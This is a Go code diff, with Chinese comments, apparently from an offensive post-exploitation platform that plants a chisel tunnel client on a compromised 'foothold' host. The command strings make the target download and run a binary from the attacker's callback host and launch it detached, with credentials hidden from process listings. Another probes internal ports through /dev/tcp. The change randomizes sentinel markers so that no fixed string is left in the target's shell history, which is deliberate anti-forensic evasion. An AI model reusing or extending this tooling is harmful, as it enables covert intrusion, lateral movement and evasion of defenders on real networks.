@@ -285,10 +285,15 @@ func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) er
 	// stage URL 主机是平台主监听地址（0.0.0.0 时还是回环占位），目标未必可达；
 	// 换成 callback host（目标回连平台用的地址），端口保留主监听口。
 	dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
-	dl := fmt.Sprintf(`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL`,
-		p.RemoteDir, dlURL, p.RemoteBin, p.RemoteBin, dlURL)
+	// 哨兵每次部署随机(批 7 补漏:固定 ARTEX_* 字样会留在目标 shell history)。
+	mk, err := randTag()
+	if err != nil {
+		return fmt.Errorf("哨兵生成失败: %w", err)
+	}
+	dl := fmt.Sprintf(`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo %s_OK || echo %s_FAIL`,
+		p.RemoteDir, dlURL, p.RemoteBin, p.RemoteBin, dlURL, mk, mk)
 	stdout, _, err := sess.Exec(ctx, dl, remoteExecWait)
-	if err == nil && strings.Contains(stdout, "ARTEX_DL_OK") {
+	if err == nil && strings.Contains(stdout, mk+"_OK") {
 		return m.chmodRemote(ctx, sess, p)
 	}
 	// 回退：目标无 curl/wget（或被拦）——经会话分块写入（session.WriteFile 内部分块）。
@@ -327,11 +332,15 @@ func rewriteURLHost(rawURL, platformAddr string) string {
 }
 
 func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
-	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo ARTEX_CHMOD_OK || echo ARTEX_CHMOD_FAIL", p.RemoteBin), probeTimeout)
+	mk, err := randTag()
+	if err != nil {
+		return fmt.Errorf("哨兵生成失败: %w", err)
+	}
+	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo %s_OK || echo %s_FAIL", p.RemoteBin, mk, mk), probeTimeout)
 	if err != nil {
 		return fmt.Errorf("chmod 执行失败: %w", err)
 	}
-	if !strings.Contains(stdout, "ARTEX_CHMOD_OK") {
+	if !strings.Contains(stdout, mk+"_OK") {
 		return fmt.Errorf("chmod 失败（目标可能 noexec 挂载 /tmp): %s", detailOf(stdout))
 	}
 	return nil
@@ -341,13 +350,17 @@ func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan
 func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
 	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
 	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
-	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
-		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
+	mk, err := randTag()
+	if err != nil {
+		return 0, fmt.Errorf("哨兵生成失败: %w", err)
+	}
+	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo %s_PID=$!`,
+		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog, mk)
 	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
 	if err != nil {
 		return 0, fmt.Errorf("拉起命令失败: %w", err)
 	}
-	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
+	_, after, found := strings.Cut(stdout, mk+"_PID=")
 	if !found {
 		return 0, fmt.Errorf("未取到远端 pid（哨兵缺失）: %s", detailOf(stdout))
 	}
@@ -417,10 +430,14 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 		return nil
 	case KindPortfwd:
 		// 预检：目标侧真实可达 target:port（反向监听对失败拨号也会 accept，不能只信入口）。
-		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
-			p.TargetHost, p.TargetPort)
+		mk, merr := randTag()
+		if merr != nil {
+			return fmt.Errorf("哨兵生成失败: %w", merr)
+		}
+		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo %s_OK || echo %s_FAIL`,
+			p.TargetHost, p.TargetPort, mk, mk)
 		stdout, _, err := sess.Exec(ctx, pre, probeTimeout)
-		if err != nil || !strings.Contains(stdout, "ARTEX_PRE_OK") {
+		if err != nil || !strings.Contains(stdout, mk+"_OK") {
 			return fmt.Errorf("目标侧预检 %s:%d 不可达（从立足点实测）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
 		}
 		conn, err := net.DialTimeout("tcp", entry, verifyTimeout)
@@ -492,9 +509,13 @@ func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, 
 // killRemote 经会话杀目标侧进程：先 kill -0 并核对 /proc/<pid>/cmdline 含远端
 // 二进制路径——查【远端】，且防 pid 复用误杀（PivotHub 查本机的缺陷在此修正）。
 func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) {
-	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo ARTEX_NO_PROC`, p.RemotePID, p.RemotePID)
+	mk, merr := randTag()
+	if merr != nil {
+		return
+	}
+	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo %s_NOPROC`, p.RemotePID, p.RemotePID, mk)
 	stdout, _, err := sess.Exec(ctx, chk, probeTimeout)
-	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") {
+	if err != nil || strings.Contains(stdout, mk+"_NOPROC") {
 		return // 远端已不在，无需杀
 	}
 	if !strings.Contains(stdout, p.RemoteBin) && !strings.Contains(stdout, "/ch ") {
